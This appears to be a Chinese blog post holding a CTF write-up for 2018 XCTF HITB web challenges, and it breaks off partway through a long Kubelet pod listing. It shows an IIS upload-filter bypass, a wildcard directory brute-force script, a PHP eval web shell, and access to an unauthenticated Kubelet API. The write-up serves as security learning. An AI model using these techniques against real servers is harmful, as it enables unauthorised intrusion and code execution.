@@ -1,0 +1,2950 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
+    <title>
+        
+        2018-XCTF-HITB-WEB · Sky&#39;s blog
+        
+    </title>
+    <link rel="icon" href= /assets/favicon.ico>
+    <!-- TODO: 在font-face加载完毕后改变字体  -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/webfont/1.6.28/webfontloader.js"></script>
+    <!-- 提前加载place holder  -->
+    <style type="text/css">
+        @font-face {
+            font-family: 'Oswald-Regular';
+            src: url(/font/Oswald-Regular.ttf);
+        }
+    </style>
+    <style type="text/css">
+        .site-intro {
+            position: relative;
+            width: 100%;
+            height: 50vh;
+            overflow: hidden;
+            box-shadow: -0.1rem 0 0.5rem 0 rgba(0, 0, 0, 0.5);
+        }
+        .site-intro-placeholder {
+            position: absolute;
+            z-index: -2;
+            top: 0;
+            left: 0px;
+            width: calc(100% + 300px);
+            height: 100%;
+            background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+            background-position: center center;
+            transform: translate3d(-226px, 0, 0);
+            animation: gradient-move 2.5s ease-out 0s 1;
+        }
+        @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+    <link rel="stylesheet" href = /css/style.css?v=20180120 />
+    <script src="//cdn.staticfile.org/jquery/3.2.1/jquery.min.js" defer></script>
+    
+    <script src="/scripts/main.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Sky&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">2018-XCTF-HITB-WEB</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Sky's blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-img" style="background-image: url(/intro/post.png)"></div>
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            2018-XCTF-HITB-WEB
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-href = web>web</a>
+    
+</div>
+            
+            <script>window._bd_share_config = { "common": { "bdSnsKey": {}, "bdText": "", "bdMini": "2", "bdMiniList": false, "bdPic": "", "bdStyle": "1", "bdSize": "16" }, "share": {} }; with (document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = "/static/api/js/share.js"];</script>
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2018/04/13</span>
+                <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                    <span class="iconfont-archer">&#xe604;</span>
+                    <span id="busuanzi_value_page_pv"></span>
+                </span>
+                <span class="shareWrapper">
+                    <span class="iconfont-archer shareIcon">
+                        &#xe601;
+                    </span>
+                    <span class="bdsharebuttonbox">
+                        <a href="#" class="bds_more shareText" data-cmd="more">Share</a>
+                    </span>
+                </span>
+            </div>
+        
+    </div>
+</div>
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <script>
+            var browser = {
+                    versions: function () {
+                        var u = window.navigator.userAgent;
+                        return {
+                            userAgent: u,
+                            trident: u.indexOf('Trident') > -1, //IE内核
+                            presto: u.indexOf('Presto') > -1, //opera内核
+                            webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+                            gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+                            mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+                            ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+                            android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+                            iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+                            iPad: u.indexOf('iPad') > -1, //是否为iPad
+                            webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+                            weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+                            uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+                        };
+                    }()
+                }
+
+            function fontLoaded(){
+                console.log('font loaded');
+                if (document.getElementsByClassName('site-intro-meta')) {
+                    document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+                    document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+                    var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
+                        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
+                        if (postIntroTags) {
+                            postIntroTags.classList.add('post-fade-in');
+                        }
+                        if (postIntroMeat) {
+                            postIntroMeat.classList.add('post-fade-in');
+                        }
+                    }
+                }
+                
+            console.log("userAgent:" + browser.versions.userAgent);
+            // UC不支持跨域，所以直接显示
+            if (browser.versions.uc) {
+                console.log("UCBrowser");
+                fontLoaded();
+            } else {
+                WebFont.load({
+                    custom: {
+                        families: ['Oswald-Regular']
+                    },
+                    loading: function () {  //所有字体开始加载
+                        // console.log('loading');
+                    },
+                    active: function () {  //所有字体已渲染
+                        fontLoaded();
+                    },
+                    inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+                        console.log('inactive: timeout');
+                        fontLoaded();
+                    },
+                    timeout: 7000 // Set the timeout to two seconds
+                });
+            }
+        </script>
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>访问题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.90.97.18:9999/</span><br></pre></td></tr></table></figure></p>
+<p>看到2个功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload.php</span><br><span class="line">pic.php</span><br></pre></td></tr></table></figure></p>
+<p>查看pic.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.90.97.18:9999/pic.php?filename=default.jpg</span><br></pre></td></tr></table></figure></p>
+<p>得到回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">width=497</span><br><span class="line">height=477</span><br></pre></td></tr></table></figure></p>
+<p>发现可以解析图片，这里尝试了一会儿文件包含<br>发现回显基本都是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">image error</span><br></pre></td></tr></table></figure></p>
+<p>后来抓包的时候看到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Server: Microsoft-IIS/7.0</span><br><span class="line">X-Powered-By: PHP/5.6.35</span><br><span class="line">Date: Fri, 13 Apr 2018 13:30:00 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 18</span><br></pre></td></tr></table></figure></p>
+<p>发现对方是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows iis7.0</span><br></pre></td></tr></table></figure></p>
+<p>想到一些上传技巧<br>尝试上传<code>1.php</code> (注意，php后有一个空格)<br>发现成功可以上传php文件,并且由于windows文件名的问题，最后的空格会被去掉，所以<br><code>1.php(空格)</code>会变成<code>1.php</code><br>但是新的问题来了，我们没有上传文件夹路径<br>后来百度windows 目录爆破的时候发现百度第一条文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.moonsec.com/post-304.html</span><br></pre></td></tr></table></figure></p>
+<p>其中写道到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">已知1.php存在，以上脚本访问的结果是：</span><br><span class="line">1.php</span><br><span class="line">1.phP</span><br><span class="line">1.ph&lt;</span><br><span class="line">1.ph&gt;</span><br><span class="line">都能得到返回。</span><br></pre></td></tr></table></figure></p>
+<p>发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p>
+<p>可以进行通配<br>根据这一点继续搜索，发现文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.freebuf.com/column/164698.html</span><br></pre></td></tr></table></figure></p>
+<p>其中提及dedecms的后台目录爆破方式<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_func</span><span class="params">($url, $path = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">    $ch = curl_init($url);</span><br><span class="line">    $i = <span class="number">48</span>;</span><br><span class="line">    <span class="keyword">global</span> $version;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>($i &lt;= <span class="number">90</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="number">48</span> &lt;= $i &amp;&amp; $i &lt;= <span class="number">57</span>) <span class="keyword">or</span> (<span class="number">65</span> &lt;= $i &amp;&amp; $i &lt;= <span class="number">90</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span>($version != <span class="string">'5.7'</span>) &#123;</span><br><span class="line">                    <span class="comment">/* v5.6版本及其以下 */</span></span><br><span class="line">                    $admin_path = <span class="string">'./'</span> . $path . chr($i) . <span class="string">'&lt;/img/admin_top_logo.gif'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">/* v5.7版本 */</span></span><br><span class="line">                    $admin_path = <span class="string">'./'</span> . $path . chr($i) . <span class="string">'&lt;/images/admin_top_logo.gif'</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                $data = <span class="string">'dopost=save&amp;_FILES[b4dboy][tmp_name]='</span> . $admin_path . <span class="string">'&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif'</span>;</span><br><span class="line"></span><br><span class="line">                $options = <span class="keyword">array</span>(</span><br><span class="line">                                CURLOPT_USERAGENT =&gt; <span class="string">'Firefox/58.0'</span>,</span><br><span class="line">                                CURLOPT_RETURNTRANSFER =&gt; <span class="keyword">true</span>,</span><br><span class="line">                                CURLOPT_POST =&gt; <span class="keyword">true</span>,</span><br><span class="line">                                CURLOPT_POSTFIELDS =&gt; $data,</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">                curl_setopt_array($ch, $options);</span><br><span class="line"></span><br><span class="line">                $response = curl_exec($ch);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(!preg_match(<span class="string">'/(Upload filetype not allow !)/i'</span>, $response)) &#123;</span><br><span class="line">                    $path = $path . chr($i);</span><br><span class="line">                    <span class="keyword">return</span> $path;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
+<p>受到通配爆破的启发，我尝试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.90.97.18:9999/pic.php?filename=../a&lt;/default.jpg</span><br></pre></td></tr></table></figure></p>
+<p>发现通配成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">width=497</span><br><span class="line">height=477</span><br></pre></td></tr></table></figure></p>
+<p>得到回显<br>于是写脚本进行fuzz<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://47.90.97.18:9999/pic.php?filename=../"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'0123456789abcdefghijklmnopqrstuvwxyz'</span>:</span><br><span class="line">        url1 = url+flag+j+<span class="string">'&lt;/default.jpg'</span></span><br><span class="line">        r = requests.get(url=url1)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"height"</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            flag +=j</span><br><span class="line">            <span class="keyword">print</span> url1</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
+<p>运行后得到目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">87194f13726af7cee27ba2cfe97b60df</span><br></pre></td></tr></table></figure></p>
+<p>后上传一句话木马<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@<span class="keyword">eval</span>($_POST[<span class="string">'sky'</span>]);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>然后菜刀连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.90.97.18:9999/87194f13726af7cee27ba2cfe97b60df/1523496144.php</span><br></pre></td></tr></table></figure></p>
+<p>成功拿到flag<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag is here"</span>;</span><br><span class="line"><span class="comment">//HITB&#123;e5f476c1e4c6dc66278db95f0b5a228a&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>故此拿到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HITB&#123;e5f476c1e4c6dc66278db95f0b5a228a&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="Baby-baby"><a href="#Baby-baby" class="headerlink" title="Baby baby"></a>Baby baby</h2><p>这题侥幸拿了3血XD<br>拿到题目后，提示是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This is a pentest challenge, open your mind!</span><br></pre></td></tr></table></figure></p>
+<p>扫了一下端口发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">80</span><br><span class="line">9999</span><br><span class="line">10250</span><br></pre></td></tr></table></figure></p>
+<p>3个端口开放<br>然后在9999端口拿到源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">This is a pentest challenge, open your mind!</span><br><span class="line">&lt;img style=<span class="string">"width: 300px;"</span> src=<span class="string">"jd.png"</span> alt=<span class="string">"the picture is unrelated to this challenge, just a advertisement"</span> /&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">eval</span>($__POST[<span class="string">"backdoor"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>发现是在逗我没错了，根本无法使用<br>后来入手10250端口<br>发现RR巨佬的文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ricterz.me/posts/Security%20Issues%20of%20Kubelet%20HTTP%28s%29%20Server</span><br></pre></td></tr></table></figure></p>
+<p>发现突破点:<br>Kubelet 在 10250 端口上提供了一个 HTTPS 的 API，通过这个 API 可以控制 </p>
+<p>在 Kubelet 的老版本（1.5 之前）不支持认证和授权，这就导致攻击者可以通过访问 10250 端口的 API 来获取容器权限。<br>而我们可以通过<code>/runningpods</code>获取正在运行的<code>Pod</code>列表：<br>于是我尝试指令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http --verify=no https://47.75.146.42:10250/runningpods/</span><br></pre></td></tr></table></figure></p>
+<p>得到回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Date: Thu, 12 Apr 2018 07:00:22 GMT</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;apiVersion&quot;: &quot;v1&quot;, </span><br><span class="line">    &quot;items&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;metadata&quot;: &#123;</span><br><span class="line">                &quot;creationTimestamp&quot;: null, </span><br><span class="line">                &quot;name&quot;: &quot;kubernetes-dashboard-688193819-svbx3&quot;, </span><br><span class="line">                &quot;namespace&quot;: &quot;kube-system&quot;, </span><br><span class="line">                &quot;uid&quot;: &quot;958e5dcc-3c7e-11e8-b3d6-00163e0245e7&quot;</span><br><span class="line">            &#125;, </span><br><span class="line">            &quot;spec&quot;: &#123;</span><br><span class="line">                &quot;containers&quot;: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;image&quot;: &quot;127.0.0.1:5000/google_containers/kubernetes-dashboard-amd64@sha256:1344175a7b6502e012102c05201d16e572c4daf803f92d2d2c07b0ac8ffb9110&quot;, </span><br><span class="line">                        &quot;name&quot;: &quot;kubernetes-dashboard&quot;, </span><br><span class="line">                        &quot;resources&quot;: &#123;&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;, </span><br><span class="line">            &quot;status&quot;: &#123;&#125;</span><br><span class="line">        &#125;, </span><br><span class="line">        &#123;</span><br><span class="line">            &quot;metadata&quot;: &#123;</span><br><span class="line">                &quot;creationTimestamp&quot;: null, </span><br><span class="line">                &quot;name&quot;: &quot;web-test-4092782360-035qx&quot;, </span><br><span class="line">                &quot;namespace&quot;: &quot;esn-system&quot;, </span><br><span class="line">                &quot;uid&quot;: &quot;a8f7e307-3e14-11e8-838a-00163e0245e7&quot;</span><br><span class="line">            &#125;, </span><br><span class="line">            &quot;spec&quot;: &#123;</span><br><span class="line">                &quot;containers&quot;: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;image&quot;: &quot;127.0.0.1:5000/esn-containers/web_test@sha256:ae129fcd94bd2978db37050f95c62311f5bf9fdbba25817e6e8a098db3a168cf&quot;, </span><br><span class="line">                        &quot;name&quot;: &quot;web-test&quot;, </span><br><span class="line">                        &quot;resources&quot;: &#123;&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;, </span><br><span class="line">            &quot;status&quot;: &#123;&#125;</span><br><span class="line">        &#125;, </span><br><span class="line">        &#123;</span><br><span class="line">            &quot;metadata&quot;: &#123;</span><br><span class="line">                &quot;creationTimestamp&quot;: null, </span><br><span class="line">                &quot;name&quot;: &quot;kube-dns-3757701935-jht7p&quot;, </span><br><span class="line">                &quot;namespace&quot;: &quot;kube-system&quot;, </span><br><span class="line">                &quot;uid&quot;: &quot;97583356-3c7e-11e8-b3d6-00163e0245e7&quot;</span><br><span class="line">            &#125;, </span><br><span class="line">            &quot;spec&quot;: &#123;</span><br><span class="line">                &quot;containers&quot;: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;image&quot;: &quot;127.0.0.1:5000/google_containers/k8s-dns-sidecar-amd64@sha256:1d3b5c493e3c8ff05262192dce1807e19375406d7a159b1c5c463144ad1c47d5&quot;, </span><br><span class="line">                        &quot;name&quot;: &quot;sidecar&quot;, </span><br><span class="line">                        &quot;resources&quot;: &#123;&#125;</span><br><span class="line">                    &#125;, </span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;image&quot;: &quot;127.0.0.1:5000/google_containers/k8s-dns-dnsmasq-nanny-amd64@sha256:13f5523c0c2422447167a5aa08a16c07e3c78db113373da312e67a78eb04c981&quot;, </span><br><span class="line">                        &quot;name&quot;: &quot;dnsmasq&quot;, </span><br><span class="line">                        &quot;resources&quot;: &#123;&#125;</span><br><span class="line">                    &#125;, </span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;image&quot;: &quot;127.0.0.1:5000/google_containers/k8s-dns-kube-dns-amd64@sha256:bcfbfd0cf6c20b17d6797c1901d17653802b1b2f31d5901698e629f23b9b60e6&quot;, </span><br><span class="line">                        &quot;name&quot;: &quot;kubedns&quot;, </span><br><span class="line">                        &quot;resources&quot;: &#123;&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;, </span><br><span class="line">            &quot;status&quot;: &#123;&#125;</span><br><span class="line">        &#125;, </span><br><span class="line">        &#123;</span><br><span class="line">            &quot;metadata&quot;: &#123;</span><br><span class="line">                &quot;creationTimestamp&quot;: null, </span><br><span class="line">                &quot;name&quot;: &quot;monitoring-grafana-3238376892-r3r57&quot;, </span><br><span class="line">                &quot;namespace&quot;: &quot;kube-system&quot;, </span><br><span class="line">                &quot;uid&quot;: &quot;96f720d7-3c7e-11e8-b3d6-00163e0245e7&quot;</span><br><span class="line">            &#125;, </span><br><span class="line">            &quot;spec&quot;: &#123;</span><br><span class="line">                &quot;containers&quot;: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;image&quot;: &quot;127.0.0.1:5000/google_containers/heapster-grafana-amd64@sha256:0b077080cff3bb20a6e89bdd3b2f05f36479ee1edf7e91732d0578ea57753b33&quot;, </span><br><span class="line">                        &quot;name&quot;: &quot;grafana&quot;, </span><br><span class="line">                        &quot;resources&quot;: &#123;&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;, </span><br><span class="line">            &quot;status&quot;: &#123;&#125;</span><br><span class="line">        &#125;, </span><br><span class="line">        &#123;</span><br><span class="line">            &quot;metadata&quot;: &#123;</span><br><span class="line">                &quot;creationTimestamp&quot;: null, </span><br><span class="line">                &quot;name&quot;: &quot;heapster-3876467971-j942t&quot;, </span><br><span class="line">                &quot;namespace&quot;: &quot;kube-system&quot;, </span><br><span class="line">                &quot;uid&quot;: &quot;972fc55d-3c7e-11e8-b3d6-00163e0245e7&quot;</span><br><span class="line">            &#125;, </span><br><span class="line">            &quot;spec&quot;: &#123;</span><br><span class="line">                &quot;containers&quot;: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;image&quot;: &quot;127.0.0.1:5000/google_containers/heapster-amd64@sha256:fb618adfed191f97b303603df043f75a42f4c1d6a4d625a0ee0cda81890c9fd0&quot;, </span><br><span class="line">                        &quot;name&quot;: &quot;heapster&quot;, </span><br><span class="line">                        &quot;resources&quot;: &#123;&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;, </span><br><span class="line">            &quot;status&quot;: &#123;&#125;</span><br><span class="line">        &#125;, </span><br><span class="line">        &#123;</span><br><span class="line">            &quot;metadata&quot;: &#123;</span><br><span class="line">                &quot;creationTimestamp&quot;: null, </span><br><span class="line">                &quot;name&quot;: &quot;monitoring-influxdb-4196588620-k597p&quot;, </span><br><span class="line">                &quot;namespace&quot;: &quot;kube-system&quot;, </span><br><span class="line">                &quot;uid&quot;: &quot;977f4ae8-3c7e-11e8-b3d6-00163e0245e7&quot;</span><br><span class="line">            &#125;, </span><br><span class="line">            &quot;spec&quot;: &#123;</span><br><span class="line">                &quot;containers&quot;: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;image&quot;: &quot;127.0.0.1:5000/google_containers/heapster-influxdb-amd64@sha256:961319e26e359294ac86294d8029d1c78e697d617ca0d645d3b227a8bd9a7817&quot;, </span><br><span class="line">                        &quot;name&quot;: &quot;influxdb&quot;, </span><br><span class="line">                        &quot;resources&quot;: &#123;&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;, </span><br><span class="line">            &quot;status&quot;: &#123;&#125;</span><br><span 